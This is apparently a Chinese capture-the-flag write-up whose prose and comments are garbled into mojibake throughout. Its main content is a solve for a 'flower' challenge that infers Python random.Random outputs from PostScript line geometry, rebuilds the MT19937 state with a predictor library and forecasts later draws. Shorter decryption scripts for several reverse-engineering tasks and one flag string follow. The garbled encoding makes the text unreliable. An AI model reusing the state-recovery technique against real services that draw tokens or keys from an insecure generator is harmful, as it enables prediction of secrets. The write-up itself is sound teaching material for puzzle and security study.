        print(f"  æœ€å°å€¼: {img_array.min()}")
        print(f"  æœ€å¤§å€¼: {img_array.max()}")
        print(f"  å¹³å‡å€¼: {img_array.mean():.2f}")
        print(f"  ä¸­ä½æ•°: {np.median(img_array):.2f}")

        # æ˜¾ç¤ºç›´æ–¹å›¾ä¿¡æ¯
        hist, _ = np.histogram(img_array, bins=256, range=(0, 256))
        print(f"\nğŸ“Š åƒç´ åˆ†å¸ƒ:")
        print(f"  é»‘è‰²(0-31): {hist[0:32].sum():,} åƒç´ ")
        print(f"  æš—è‰²(32-95): {hist[32:96].sum():,} åƒç´ ")
        print(f"  ä¸­è‰²(96-159): {hist[96:160].sum():,} åƒç´ ")
        print(f"  äº®è‰²(160-223): {hist[160:224].sum():,} åƒç´ ")
        print(f"  ç™½è‰²(224-255): {hist[224:256].sum():,} åƒç´ ")

    else:
        print(f"  âš ï¸  æ•°æ®é•¿åº¦ä¸åŒ¹é…: {len(binary_data)} â‰  {width * height}")

    print("\n" + "=" * 70)
    print("âœ… å®Œæˆï¼è¯·æŸ¥çœ‹:")
    print("  - image_freq_original.png (åŸå§‹)")
    print("  - image_freq_inverted.png (åè‰²)")
    print("=" * 70)


if __name__ == '__main__':
    decode_and_visualize()
```

ç„¶åç”Ÿæˆçš„å›¾ç‰‡å°±èƒ½çœ‹åˆ°flagäº†ï¼ˆ



# another flower



## 0x00 é¢˜ç›®å›é¡¾

é¢˜ç›®ç»™äº†ç”»æ ‘çš„æºç  `tree.py` å’Œç¬¬ä¸€æ£µæ ‘å¯¼å‡ºçš„ PostScript æ–‡ä»¶ `my_tree1.ps`ï¼Œåœ¨çº¿éªŒè¯è¦æ±‚ï¼š

> ä¸Šä¼ ä¸€æ£µâ€œç¬¬äºŒæ£µæ ‘â€çš„ ps æ–‡ä»¶ï¼Œå’Œå‡ºé¢˜äººæ ‡å‡†çš„ç¬¬äºŒæ£µæ ‘ç›¸ä¼¼åº¦é˜ˆå€¼ < 1000 å°±åˆ¤ ACã€‚

æºç å¤§æ„ï¼š

- ç”¨ `random.Random(secret_seed)` è®°ä¸º `R1`
- ç”¨ `random.Random("flower")` è®°ä¸º `R2`
- è°ƒç”¨ä¸¤æ¬¡ `Tree().tree(12, 100)`ï¼Œåˆ†åˆ«å¯¼å‡º `my_tree1.ps` å’Œ `my_tree2.ps`
- ç¬¬ä¸€æ£µæ ‘ã€ç¬¬äºŒæ£µæ ‘å®Œå…¨å…±ç”¨åŒä¸€ä¸ª `R1` çŠ¶æ€ï¼ˆä¸­é—´æ²¡é‡ç½®ï¼‰

é¢˜ç›®åªç»™äº†ç¬¬ä¸€æ£µæ ‘çš„ PSï¼Œè®©æˆ‘ä»¬â€œæ¨å‡ºâ€ç¬¬äºŒæ£µæ ‘ã€‚

------

## 0x01 ä»£ç å…³é”®ç‚¹

æ ¸å¿ƒå‡½æ•°ï¼š

```python
R1 = random.Random(secret_seed)
R2 = random.Random("flower")

def get_random(R):
    int_r = R.getrandbits(32)
    r = int_r / 2**32
    return r

def tree(self, n, l):
    turtle.pd()
    t = cos(radians(turtle.heading() + 45)) / 8 + 0.25
    turtle.pencolor(t, t, t)
    turtle.pensize(n / 1.2)
    turtle.forward(l)

    if n > 0:  # å†…èŠ‚ç‚¹
        b = get_random(R1) * 15 + 10
        c = get_random(R1) * 15 + 10
        d = l * (get_random(R1) * 0.25 + 0.7)

        turtle.right(b)
        self.tree(n - 1, d)
        turtle.left(b + c)
        self.tree(n - 1, d)
        turtle.right(c)
    else:      # å¶å­å’Œæ‰è½èŠ±ç“£ï¼Œç”¨çš„æ˜¯ R2ï¼ˆå›ºå®šç§å­ "flower"ï¼‰
        ...
    turtle.pu()
    turtle.backward(l)
```

ä¿¡æ¯ç‚¹ï¼š

- æ¯ä¸ªéå¶å­èŠ‚ç‚¹ï¼ˆ`n > 0`ï¼‰è°ƒç”¨ **3 æ¬¡** `get_random(R1)`ï¼š
  - `b = r1 * 15 + 10`ï¼ˆå³å­æ ‘è§’åº¦ï¼‰
  - `c = r2 * 15 + 10`ï¼ˆå·¦å­æ ‘è§’åº¦ï¼‰
  - `d = l * (r3 * 0.25 + 0.7)`ï¼ˆå­æ ‘é•¿åº¦ï¼‰
- æ·±åº¦æ˜¯ 12ï¼Œæ ‘æ˜¯æ»¡äºŒå‰æ ‘ï¼š
  - éå¶å­èŠ‚ç‚¹æ•°ï¼š`2^12 - 1 = 4095`
  - ç¬¬ä¸€æ£µæ ‘ä¸€å…±ç”¨æ‰ `4095 * 3 = 12285` ä¸ª 32bit éšæœºæ•°ï¼ˆ`getrandbits(32)`ï¼‰
- `get_random` æ˜¯ **çº¯åˆ†æ•°**ï¼š`int_r / 2^32`ï¼Œæ²¡æœ‰é¢å¤–å™ªå£°ï¼ŒåŒç²¾åº¦å¯ä»¥å®Œå…¨è¡¨ç¤º 32bit åˆ†æ•°ã€‚

------

## 0x02 æ€è·¯æ¦‚è§ˆ

æ•´é¢˜çš„æ ¸å¿ƒæ˜¯ï¼š

> **ä»å‡ ä½•ä¿¡æ¯åæ¨éšæœºæ•°ï¼Œä»éšæœºæ•°è¿˜åŸ PRNG çŠ¶æ€ã€‚**

æµç¨‹ï¼š

1. **ä» `my_tree1.ps` é‡Œè§£ææ‰€æœ‰æ ‘æçº¿æ®µ**
   æ¯æ ¹æ ‘æå¯¹åº”ä¸€æ®µç±»ä¼¼ï¼š

   ```ps
   gsave
   x1 y1 moveto
   x2 y2 lineto
   ...
   <width> setlinewidth
   ...
   stroke
   grestore
   ```

   æˆ‘ä»¬æŠ½å‡º `(x1,y1) â†’ (x2,y2)` å’Œ `width`ã€‚

2. **ç”¨â€œç»ˆç‚¹ = å­æ®µèµ·ç‚¹â€æŠŠçº¿æ®µè¿æˆæ ‘**

   - æŒ‰ç«¯ç‚¹è·ç¦» < Îµ çš„è§„åˆ™ï¼ŒæŠŠçˆ¶æ®µçš„ç»ˆç‚¹å’Œå­æ®µçš„èµ·ç‚¹è¿èµ·æ¥ï¼›
   - ç»Ÿè®¡å…¥åº¦=0 æ‰¾åˆ°å”¯ä¸€æ ¹ï¼›
   - æ¯ä¸ªéå¶å­æ°å¥½æœ‰ä¸¤ä¸ªå­©å­ï¼Œæ„æˆä¸€æ£µæ»¡äºŒå‰æ ‘ã€‚

3. **é‡å»ºé€’å½’é¡ºåº + å‡ ä½•å…³ç³» â†’ åæ¨ 3 ä¸ªéšæœºæ•°**

   å¯¹äºæ¯ä¸ªéå¶å­èŠ‚ç‚¹ï¼š

   - çˆ¶æå‘é‡ `v_p = (x2-x1, y2-y1)`ï¼Œè§’åº¦ `Î¸_p = atan2(...)`

   - ä¸¤ä¸ªå­æå‘é‡ `v_r, v_l`ï¼Œè§’åº¦ `Î¸_r, Î¸_l`

   - è§’åº¦å·®ï¼š

     - `Î”Î¸_r = Î¸_r - Î¸_p â‰ˆ -b (deg)`
     - `Î”Î¸_l = Î¸_l - Î¸_p â‰ˆ +c (deg)`

   - äºæ˜¯å¯ä»¥åæ¨å‡ºï¼š

     ```text
     b_est = -Î”Î¸_r (åº¦æ•°)
     c_est =  Î”Î¸_l (åº¦æ•°)
     r_b = (b_est - 10) / 15
     r_c = (c_est - 10) / 15
     int_b = round(r_b * 2^32)
     int_c = round(r_c * 2^32)
     ```

   - é•¿åº¦å…³ç³»ï¼š

     ```text
     parent_len = |v_p|
     child_len  â‰ˆ |v_r| â‰ˆ |v_l|
     ratio = child_len / parent_len
     
     ratio = 0.25 * r_d + 0.7
     => r_d = (ratio - 0.7) / 0.25
     int_d = round(r_d * 2^32)
     ```

   - è¿™æ ·æ¯ä¸ªå†…èŠ‚ç‚¹å¯ä»¥æ¢å¤å‡º `b,c,d` å¯¹åº”çš„ **3 ä¸ª int32**ï¼Œé¡ºåºå°±æ˜¯çœŸå®ç¨‹åºé‡Œ `get_random(R1)` çš„è°ƒç”¨é¡ºåºã€‚

   æ³¨æ„ DFS é¡ºåºè¦å’Œæºç ä¸€è‡´ï¼š
    `tree()` æ˜¯â€œå…ˆå½“å‰èŠ‚ç‚¹è¯» 3 æ¬¡ï¼Œç„¶åå…ˆå³å­æ ‘ï¼Œå†å·¦å­æ ‘â€ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿˜åŸæ—¶ä¹ŸæŒ‰è¿™ä¸ªé¡ºåºé€’å½’ã€‚

4. **ç”¨å‰ 624 ä¸ªè¾“å‡ºè¿˜åŸ MT19937**

   Python çš„ `random.Random` æ˜¯ MT19937ï¼Œå†…éƒ¨çŠ¶æ€æ˜¯ 624 ä¸ª 32bit wordã€‚
    å·²çŸ¥ 624 ä¸ªè¿ç»­è¾“å‡ºå°±èƒ½å”¯ä¸€æ¢å¤æ•´æ£µçŠ¶æ€ã€‚

   ç›´æ¥ç”¨å…¬å¼€å®ç°ï¼ˆæ¯”å¦‚ `mt19937predictor`ï¼‰ï¼š

   ```python
   from mt19937predictor import MT19937Predictor
   
   outs = [...]  # æŒ‰ DFS é¡ºåºæ¢å¤å‡ºçš„æ‰€æœ‰ int32
   
   pred = MT19937Predictor()
   for x in outs[:624]:
       pred.setrandbits(x, 32)
   
   # ä¸ºäº†å¯¹é½çŠ¶æ€ï¼ŒæŠŠåé¢ç”¨æ‰çš„éšæœºæ•°â€œåƒæ‰â€
   for _ in outs[624:]:
       pred.getrandbits(32)
   ```

   è¿™æ · `pred` çš„å†…éƒ¨çŠ¶æ€å°±å’ŒçœŸå®çš„ `R1` åœ¨â€œç”»å®Œç¬¬ä¸€æ£µæ ‘â€æ—¶å®Œå…¨ä¸€è‡´ã€‚

5. **ç”¨å…‹éš†å‡ºçš„ R1 ç”»ç¬¬äºŒæ£µæ ‘**

   å†™ä¸€ä¸ªå°å£³ï¼ŒæŠŠ `Tree` é‡Œçš„ `get_random(R1)` æ”¹æˆè°ƒç”¨æˆ‘ä»¬è‡ªå·±çš„ `R1Clone`ï¼š

   ```python
   class R1Clone:
       def __init__(self, predictor):
           self.p = predictor
       def getrandbits(self, k):
           assert k == 32
           return self.p.getrandbits(32)
   
   R1_global = R1Clone(pred)
   R2_global = random.Random("flower")  # å›ºå®šçš„
   
   def get_random_R1():
       return R1_global.getrandbits(32) / 2**32
   
   # Tree ä»£ç åŸºæœ¬ç…§æŠ„ï¼ŒæŠŠ get_random(R1) æ¢æˆ get_random_R1()
   # å†è·‘ tree(12,100)ï¼Œå¯¼å‡º my_tree2.ps å³å¯
   ```

   å› ä¸º R2 çš„ç§å­ä¹Ÿæ˜¯å›ºå®š `"flower"`ï¼Œå¶å­å’Œæ‰è½èŠ±ç“£ä¹Ÿä¼šå®Œå…¨ä¸€è‡´ï¼Œæ‰€ä»¥æœ€ç»ˆçš„ `my_tree2.ps` å’Œå®˜æ–¹æ ‡å‡†ç¬¬äºŒæ£µæ ‘å‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼Œç›¸ä¼¼åº¦é˜ˆå€¼ < 1000 è½»æ¾é€šè¿‡ã€‚

------

## 0x03 å®ç°è¦ç‚¹å°ç»“

å¯ä»¥åœ¨ wp é‡Œç®€å•åˆ—ä¸€ä¸‹å…³é”®å®ç°ç‚¹ï¼š

- PS è§£æï¼šç”¨æ­£åˆ™æŠ“ `moveto/lineto/setlinewidth/setrgbcolor` è¿™äº›å…³é”®å­—ï¼ŒåªæŠ½æ ‘æçº¿æ®µã€‚
- å»ºæ ‘ï¼šç”¨â€œç»ˆç‚¹â†’èµ·ç‚¹â€åŒ¹é…ï¼Œä¸¤ä¸¤è·ç¦» < Îµ å³è®¤ä¸ºè¿æ¥ï¼Œæ„æˆé‚»æ¥è¡¨ï¼›æ‰¾å…¥åº¦ä¸º 0 çš„æ ¹ã€‚
- è§’åº¦ / é•¿åº¦åæ¨éšæœºæ•°ï¼š
  - è§’åº¦å·® `Î”Î¸` â†’ `b,c` â†’ `r_b,r_c` â†’ `int_b,int_c`
  - é•¿åº¦æ¯” `ratio` â†’ `r_d` â†’ `int_d`
- æŒ‰é€’å½’é¡ºåº DFSï¼šä¸€è¾¹èµ°ä¸€è¾¹å‘è¾“å‡ºæ•°ç»„ `outs` append ä¸‰ä¸ª intã€‚
- ç”¨ `MT19937Predictor` è¿˜åŸçŠ¶æ€ï¼Œæ¨è¿›åˆ°ç¬¬ä¸€æ£µæ ‘ç»“æŸã€‚
- ç”¨å…‹éš†å‡ºçš„ R1 + å›ºå®š R2 å†ç”»ä¸€æ£µï¼Œå¯¼å‡º `my_tree2.ps` ä¸Šä¼ å³å¯ã€‚

------

## 0x04 ä¸€å¥è¯æ€»ç»“

è¿™é¢˜è¡¨é¢çœ‹æ˜¯â€œæ‹Ÿåˆä¸€æ£µç›¸ä¼¼çš„æ ‘â€ï¼Œå®é™…ä¸Šæ˜¯ï¼š

> **ä» PostScript çš„å‡ ä½•ä¿¡æ¯ç²¾ç¡®åæ¨ random.Random çš„ 32bit è¾“å‡ºï¼Œ
> ç”¨ 624 ä¸ªè¾“å‡ºè¿˜åŸ MT19937 å†…éƒ¨çŠ¶æ€ï¼Œå†é¢„æµ‹åŒä¸€ PRNG ä¸‹çš„â€œç¬¬äºŒæ£µèŠ±â€ã€‚**

æœ€ç»ˆè„šæœ¬

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
è§£æ my_tree1.psï¼Œåæ¨å‡ºç¬¬ä¸€æ£µæ ‘ç”¨è¿‡çš„ R1.getrandbits(32)ï¼Œ
ç”¨ MT19937Predictor è¿˜åŸ random.Random(secret_seed) çš„çŠ¶æ€ï¼Œ
å†ç”»å‡ºç¬¬äºŒæ£µæ ‘å¹¶å¯¼å‡º ps æ–‡ä»¶ã€‚

ç”¨æ³•:
    python solve_flower.py my_tree1.ps my_tree2.ps

ä¾èµ–:
    pip install mersenne-twister-predictor
"""

import re
import sys
import math
import random
from collections import defaultdict

from mt19937predictor import MT19937Predictor
import turtle
from math import cos, radians


TWO32 = 1 << 32
EPS_MATCH = 1e-4   # åŒ¹é…ç«¯ç‚¹çš„è·ç¦»é˜ˆå€¼ï¼ˆå•ä½ï¼šps åæ ‡ï¼‰


class Segment:
    __slots__ = ("idx", "x1", "y1", "x2", "y2", "w")

    def __init__(self, idx, x1, y1, x2, y2, w):
        self.idx = idx
        self.x1 = x1
        self.y1 = y1
        self.x2 = x2
        self.y2 = y2
        self.w = w  # line width = n / 1.2


def parse_segments(ps_text):
    """
    ä» PostScript ä¸­è§£æå‡ºæ‰€æœ‰æ ‘æçº¿æ®µã€‚

    çº¿æ®µæ ¼å¼å¤§è‡´ä¸ºï¼š
        gsave
        x1 y1 moveto
        x2 y2 lineto
        1 setlinecap
        1 setlinejoin
        <width> setlinewidth
        [] 0 setdash
        r g b setrgbcolor AdjustColor
        stroke
        grestore
    """
    seg_re = re.compile(
        r"gsave\s+"
        r"([-\d\.]+)\s+([-\d\.]+)\s+moveto\s+"
        r"([-\d\.]+)\s+([-\d\.]+)\s+lineto\s+"
        r"1\s+setlinecap\s+"
        r"1\s+setlinejoin\s+"
        r"([-\d\.]+)\s+setlinewidth\s+"
        r"\[\]\s+0\s+setdash\s+"
        r"([0-9\.]+)\s+([0-9\.]+)\s+([0-9\.]+)\s+setrgbcolor\s+AdjustColor\s+"
        r"stroke\s+grestore",
        re.MULTILINE,
    )

    segments = []
    for idx, m in enumerate(seg_re.finditer(ps_text)):
        x1 = float(m.group(1))
        y1 = float(m.group(2))
        x2 = float(m.group(3))
        y2 = float(m.group(4))
        w = float(m.group(5))
        segments.append(Segment(idx, x1, y1, x2, y2, w))

    print(f"[+] parsed {len(segments)} segments from ps")
    return segments


def build_tree(segments, eps=EPS_MATCH):
    """
    ç”¨â€œç»ˆç‚¹ â‰ˆ èµ·ç‚¹â€çš„å…³ç³»ï¼ŒæŠŠçº¿æ®µè¿æˆä¸€æ£µæ ‘ã€‚
    è¿”å›:
        root_idx: æ ¹èŠ‚ç‚¹ä¸‹æ ‡
        children: children[i] = [child_idx1, child_idx2] æˆ– []
    """
    n = len(segments)
    children = [[] for _ in range(n)]
    eps2 = eps * eps

    # ä¸ºäº†ç®€å•ï¼Œç›´æ¥ O(n^2) æš´åŠ›åŒ¹é…ï¼ˆ8191^2 è§„æ¨¡è¿˜èƒ½æ¥å—ï¼‰
    for i, seg_i in enumerate(segments):
        ex, ey = seg_i.x2, seg_i.y2
        for j, seg_j in enumerate(segments):
            if i == j:
                continue
            sx, sy = seg_j.x1, seg_j.y1
            dx = sx - ex
            dy = sy - ey
            if dx * dx + dy * dy <= eps2:
                children[i].append(j)

    # è®¡ç®—å…¥åº¦æ‰¾æ ¹
    indeg = [0] * n
    for i in range(n):
        for j in children[i]:
            indeg[j] += 1

    roots = [i for i in range(n) if indeg[i] == 0]
    if len(roots) != 1:
        raise RuntimeError(f"expected 1 root, got {len(roots)}: {roots}")
    root = roots[0]
    print(f"[+] root segment index = {root}")

    # ç®€å• sanity checkï¼šæ»¡äºŒå‰æ ‘
    cnt_children = [len(c) for c in children]
    print(
        f"[+] children count histogram: "
        f"0 -> {cnt_children.count(0)}, 2 -> {cnt_children.count(2)}"
    )

    return root, children


def angle_deg(vx, vy):
    return math.degrees(math.atan2(vy, vx))


def normalize_delta(delta_rad):
    """æŠŠè§’åº¦å·®è§„æ•´åˆ° [-pi, pi]"""
    while delta_rad <= -math.pi:
        delta_rad += 2 * math.pi
    while delta_rad > math.pi:
        delta_rad -= 2 * math.pi
    return delta_rad


def decode_angle_to_int(angle_deg):
    """
    ç”± b / c è§’åº¦åæ¨éšæœºæ•° int_rï¼š
        angle = r * 15 + 10
    """
    r_est = (angle_deg - 10.0) / 15.0
    # ç†è®ºä¸Šåœ¨ [0,1)ï¼Œè¿™é‡Œç¨å¾®å®¹å¿ä¸€ç‚¹æµ®ç‚¹è¯¯å·®
    r_est = max(0.0, min(r_est, 1.0 - 1e-12))
    val = int(round(r_est * TWO32))
    return val


def angle_from_int(val):
    return (val / float(TWO32)) * 15.0 + 10.0


def decode_ratio_to_int(ratio):
    """
    ç”± child_len / parent_len çš„æ¯”ä¾‹åæ¨éšæœºæ•° int_rï¼š
        ratio = 0.25 * r + 0.7
    """
    r_est = (ratio - 0.7) / 0.25
    r_est = max(0.0, min(r_est, 1.0 - 1e-12))
    val = int(round(r_est * TWO32))
    return val


def ratio_from_int(val):
    return 0.25 * (val / float(TWO32)) + 0.7


def reconstruct_R1_outputs(segments, children, root_idx, debug=False):
    """
    æŒ‰çœŸæ­£è°ƒç”¨é¡ºåº (æ ¹ -> å³å­æ ‘ -> å·¦å­æ ‘)
    è¿˜åŸå‡ºæ‰€æœ‰ R1.getrandbits(32) è¾“å‡ºï¼Œè¿”å› int åˆ—è¡¨ã€‚
    """
    outs = []

    sys.setrecursionlimit(10000)

    def dfs(node_idx):
        seg = segments[node_idx]
        vx = seg.x2 - seg.x1
        vy = seg.y2 - seg.y1
        parent_len = math.hypot(vx, vy)
        theta_p = math.atan2(vy, vx)

        ch = children[node_idx]
        if seg.w > 0 and len(ch) == 2:
            info = []
            for ci in ch:
                cseg = segments[ci]
                cvx = cseg.x2 - cseg.x1
                cvy = cseg.y2 - cseg.y1
                child_len = math.hypot(cvx, cvy)
                theta_c = math.atan2(cvy, cvx)
                delta = normalize_delta(theta_c - theta_p)
                delta_deg = math.degrees(delta)
                info.append((ci, child_len, delta_deg))

            rights = [x for x in info if x[2] < 0]  # å³å­æ ‘ï¼šè´Ÿè§’åº¦
            lefts = [x for x in info if x[2] > 0]   # å·¦å­æ ‘ï¼šæ­£è§’åº¦
            if len(rights) != 1 or len(lefts) != 1:
                raise RuntimeError(f"bad child classification at node {node_idx}: {info}")

            rc_idx, rc_len, delta_r = rights[0]
            lc_idx, lc_len, delta_l = lefts[0]

            # åæ¨ b, c, d å¯¹åº”çš„ int_r
            b_deg = -delta_r
            c_deg = delta_l

            int_b = decode_angle_to_int(b_deg)
            int_c = decode_angle_to_int(c_deg)

            avg_child_len = 0.5 * (rc_len + lc_len)
            ratio = avg_child_len / parent_len
            int_d = decode_ratio_to_int(ratio)

            if debug:
                b2 = angle_from_int(int_b)
                c2 = angle_from_int(int_c)
                r2 = ratio_from_int(int_d)
                if (abs(b2 - b_deg) > 1e-4 or
                        abs(c2 - c_deg) > 1e-4 or
                        abs(r2 - ratio) > 1e-4):
                    print(" [!] mismatch at node", node_idx,
                          "b:", b_deg, b2, "c:", c_deg, c2, "ratio:", ratio, r2)

            # é¡ºåºï¼šb, c, d
            outs.extend([int_b, int_c, int_d])

            # é€’å½’é¡ºåºï¼šå³ -> å·¦
            dfs(rc_idx)
            dfs(lc_idx)
        else:
            # å¶å­èŠ‚ç‚¹ä¸ä¼šè°ƒç”¨ R1
            return

    dfs(root_idx)
    print(f"[+] reconstructed {len(outs)} R1 outputs "
          f"(= 3 * {len(outs) // 3} internal nodes)")
    return outs


class R1Clone:
    """ç”¨ MT19937Predictor æ¨¡æ‹Ÿ random.Random(secret_seed) çš„ getrandbitsã€‚"""

    def __init__(self, predictor: MT19937Predictor):
        self.p = predictor

    def getrandbits(self, k):
        # é¢˜é‡Œåªç”¨ getrandbits(32)
        if k != 32:
            raise ValueError("only 32-bit getrandbits is supported")
        return self.p.getrandbits(32)


# ===================== é‡æ–°å®ç° Treeï¼ˆå»æ‰ secret_seedï¼‰ ===================== #

# R2 çš„ç§å­æ˜¯å›ºå®šçš„
R1_global = None   # ç¨åæ›¿æ¢æˆ R1Clone
R2_global = random.Random("flower")


def get_random_R1():
    int_r = R1_global.getrandbits(32)
    return int_r / TWO32


def get_random_R2():
    int_r = R2_global.getrandbits(32)
    return int_r / TWO32


class Tree:
    def __init__(self):
        turtle.setup(1000, 700)
        turtle.bgcolor(1, 1, 1)
        turtle.speed(0)
        turtle.tracer(0, 0)
        turtle.pu()
        turtle.backward(100)
        turtle.left(90)
        turtle.backward(300)

    def tree(self, n, l):
        turtle.pd()
        t = cos(radians(turtle.heading() + 45)) / 8 + 0.25
        turtle.pencolor(t, t, t)
        turtle.pensize(n / 1.2)
        turtle.forward(l)
        if n > 0:
            # ç”¨æˆ‘ä»¬å…‹éš†å‡ºæ¥çš„ R1
            b = get_random_R1() * 15 + 10
            c = get_random_R1() * 15 + 10
            d = l * (get_random_R1() * 0.25 + 0.7)

            turtle.right(b)
            self.tree(n - 1, d)
            turtle.left(b + c)
            self.tree(n - 1, d)
            turtle.right(c)
        else:
            # å¶å­éƒ¨åˆ†ï¼Œç…§æŠ„é¢˜ç›®çš„é€»è¾‘ï¼Œç”¨å›ºå®šç§å­çš„ R2
            turtle.right(90)
            nleaf = cos(radians(turtle.heading() - 45)) / 4 + 0.5
            turtle.pencolor(nleaf, nleaf * 0.8, nleaf * 0.8)
            turtle.fillcolor(nleaf, nleaf * 0.8, nleaf * 0.8)
            turtle.begin_fill()
            turtle.circle(3)
            turtle.left(90)
            turtle.end_fill()
            if get_random_R2() > 0.7:
                turtle.pu()
                t_head = turtle.heading()
                an = -40 + get_random_R2() * 40
                turtle.setheading(an)
                dis = int(
                    800 * get_random_R2() * 0.5 +
                    400 * get_random_R2() * 0.3 +
                    200 * get_random_R2() * 0.2
                )
                turtle.forward(dis)
                turtle.setheading(t_head)
                turtle.pd()
                turtle.right(90)
                nleaf2 = cos(radians(turtle.heading() - 45)) / 4 + 0.5
                turtle.pencolor(
                    nleaf2 * 0.5 + 0.5,
                    0.4 + nleaf2 * 0.4,
                    0.4 + nleaf2 * 0.4,
                )
                turtle.fillcolor(nleaf2, nleaf2 * 0.8, nleaf2 * 0.8)
                turtle.begin_fill()
                turtle.circle(2)
                turtle.left(90)
                turtle.end_fill()
                turtle.pu()
                t_head = turtle.heading()
                turtle.setheading(an)
                turtle.backward(dis)
                turtle.setheading(t_head)
        turtle.pu()
        turtle.backward(l)

        return turtle.getscreen()


# =============================== main æµç¨‹ =============================== #

def main():
    if len(sys.argv) < 3:
        print("Usage: python solve_flower.py my_tree1.ps my_tree2.ps")
        sys.exit(1)

    ps_in = sys.argv[1]
    ps_out = sys.argv[2]

    print(f"[+] reading {ps_in} ...")
    with open(ps_in, "r", errors="ignore") as f:
        ps_text = f.read()

    segments = parse_segments(ps_text)
    root_idx, children = build_tree(segments)
    outs = reconstruct_R1_outputs(segments, children, root_idx, debug=False)

    # ç”¨å‰ 624 ä¸ªè¾“å‡ºå–‚ç»™ MT19937Predictor
    print("[+] seeding MT19937Predictor with first 624 outputs ...")
    predictor = MT19937Predictor()
    for x in outs[:624]:
        predictor.setrandbits(x, 32)

    # åƒæ‰å‰©ä¸‹çš„è¾“å‡ºï¼ŒæŠŠçŠ¶æ€æ¨åˆ°ç¬¬ä¸€æ£µæ ‘ç»“æŸä¹‹å
    remaining = outs[624:]
    print(f"[+] advancing predictor by remaining {len(remaining)} outputs ...")
    for _ in remaining:
        predictor.getrandbits(32)

    # åŒ…è£…æˆå…¨å±€ R1
    global R1_global
    R1_global = R1Clone(predictor)

    print("[+] drawing second tree with cloned R1 ...")
    turtle.reset()
    tree2 = Tree()
    screen2 = tree2.tree(12, 100)
    canvas2 = screen2.getcanvas()
    canvas2.postscript(file=ps_out)
    print(f"[+] saved second tree to {ps_out}")

    # å¦‚æœä¸æƒ³å¼¹ turtle çª—å£ï¼Œå¯ä»¥ç›´æ¥ bye
    try:
        turtle.bye()
    except turtle.Terminator:
        pass


if __name__ == "__main__":
    main()

```

ç”¨æ³•

```
(latt) âœ  ~ python lll.py  my_tree1.ps  my_tree2.ps
[+] reading my_tree1.ps ...
[+] parsed 8191 segments from ps
[+] root segment index = 0
[+] children count histogram: 0 -> 4096, 2 -> 4095
[+] reconstructed 12285 R1 outputs (= 3 * 4095 internal nodes)
[+] seeding MT19937Predictor with first 624 outputs ...
[+] advancing predictor by remaining 11661 outputs ...
[+] drawing second tree with cloned R1 ...
[+] saved second tree to my_tree2.ps
```

# REæ–¹å‘ REæ–¹å‘ REæ–¹å‘

# EZPYC

åç¼–è¯‘åå†™å‡ºè§£å¯†è„šæœ¬

```
import math
def de33(cipher_str: bytes, n: int) -> bytes:
    """æ•´ä½“ bitstream å¾ªç¯å³ç§» n ä½"""
    bit_len = len(cipher_str) * 8
    n = n % bit_len
    val = int.from_bytes(cipher_str, 'big')
    val = (val >> n | val << bit_len - n) & (1 << bit_len) - 1
    return val.to_bytes(len(cipher_str), 'big')
def de3(b: int) -> int:
    return b << 4 & 240 | b >> 4 & 15
def dec(cipher_str: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in cipher_str])

cipher = [48, 55, 57, 50, 53, 55, 53, 50, 52, 50, 48, 55, 101, 52, 53, 50, 52, 50, 52, 50, 48, 55, 53, 55, 55, 55, 50, 54, 53, 55, 54, 55, 55, 55, 53, 54, 98, 55, 97, 54, 50, 53, 56, 52, 50, 52, 99, 54, 50, 50, 52, 50, 50, 54]
cipher_str = ''.join(chr(c) for c in cipher)
cipher_str = bytearray.fromhex(cipher_str)
print(cipher_str)
cipher_str = de33(cipher_str, 32)
cipher_str = cipher_str[::-1]
cipher_str = bytes([de3(b) for b in cipher_str])
cipher_str = dec(cipher_str, 17)
print(cipher_str)
```

# EZRUST

æ”¹ä¸€ä¸‹ç¨‹åºè·å¾—å¯†æ–‡ä¸¢cyberchef![9d2746711898c5dfc16ecf69efae1a50](C:/Users/HONOR/Documents/Tencent Files/3645500659/nt_qq/nt_data/Pic/2025-10/Ori/9d2746711898c5dfc16ecf69efae1a50.png)

ä¸‹é¢memcmpå°±èƒ½æ‹¿å¯†æ–‡äº†

![89b2c73a121501465b3a4045a0684dfd](C:/Users/HONOR/Documents/Tencent Files/3645500659/nt_qq/nt_data/Pic/2025-10/Ori/89b2c73a121501465b3a4045a0684dfd.png)

# ezSMC

ä¸çœŸé¢˜

![67bc48ddf988dbaa654330cfd69759f2](C:/Users/HONOR/Documents/Tencent Files/3645500659/nt_qq/nt_data/Pic/2025-10/Ori/67bc48ddf988dbaa654330cfd69759f2.png)

# only_Flower

èŠ±å°±æŠŠä¸€äº›è¯¡å¼‚çš„åœ°æ–¹nopæ‰ç„¶åä¸€ç›´cå°±èƒ½çœ‹å‡ºæ¥ä»£ç äº†

è§£å¯†è„šæœ¬

```
def ror8(v, n):
    return ((v >> (n & 7)) | (v << (8 - (n & 7 )))) & 0xFF

CIPHER = [
    0x0A, 0x84, 0xC2, 0x84, 0x51, 0x48, 0x5F, 0xF2, 0x9E, 0x8D,
    0xD0, 0x84, 0x75, 0x67, 0x73, 0x8F, 0xCA, 0x57, 0xD7, 0xE6,
    0x14, 0x6E, 0x77, 0xE2, 0x29, 0xFE, 0xDF, 0xCC
]
out = ''
key=b"GEEK2025"

klen = len(key)

for i in range(28):
    out += chr(ror8(CIPHER[i]-i,key[i%klen]&7)^key[i%klen])
print(out)
```



# QYQS_____

æ˜“å¾—è§£å¯†è„šæœ¬

```
qyqs=[2,1,16,43,28,3,23,57,6,1,34,41,14,11,45,109,6,32,23,127,56]
len=21
key=b"QYQS"
flag=''
for i in range(21):
    qyqs[i]^=key[i%4]
    qyqs[i]^=i
    flag+=chr(qyqs[i])
print (flag)
```

# QYQS_____2

åˆ°å¤„ç¿»èƒ½ç›´æ¥æ‰¾åˆ°ï¼ˆ

ä¸åƒreé¢˜å¥½å­ã€‚ã€‚

SYC{M@y_bE_y0u_F1nd?}
data:00007FF6A709F000

# Reverse

ç¬¬ä¸€æ­¥ï¼ŒæŠŠæ‰€æœ‰æ±‡ç¼–ä»£ç ä¸¢ç»™aiï¼Œç»™å‡ºä¸€èˆ¬æç¤ºè¯

è¿è¡Œåç»™å‡ºç¬¬äºŒä¸ªæç¤ºè¯

![image-20251103210116503](C:/Users/HONOR/AppData/Roaming/Typora/typora-user-images/image-20251103210116503.png)

